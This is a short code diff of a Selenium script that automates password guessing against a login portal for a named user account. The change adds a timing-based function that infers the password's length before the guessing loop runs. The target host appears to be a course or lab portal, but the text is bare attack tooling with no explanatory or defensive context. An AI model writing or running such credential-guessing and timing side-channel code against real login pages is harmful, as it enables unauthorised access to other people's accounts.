@@ -3,12 +3,14 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 import time
 import re
+from timing import get_password_length
 
+webpage = "https://portal.regjeringen.uiaikt.no/"  # Edit the URL
 username = "jonas.dahl"
 
 password_guess = ""
 
-password_length = 17
+password_length = get_password_length(username, webpage, 100, .1)
 
 
 def extract_numbers(input_string):
@@ -58,8 +60,6 @@ def print_characters():
         driver.find_element(By.CLASS_NAME, "btn-primary").click()
         time.sleep(0.1)
 
-
-webpage = "https://portal.regjeringen.uiaikt.no/"  # Edit the URL
 
 # Ensure you have the correct path to your ChromeDriver executable
 chrome_driver_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
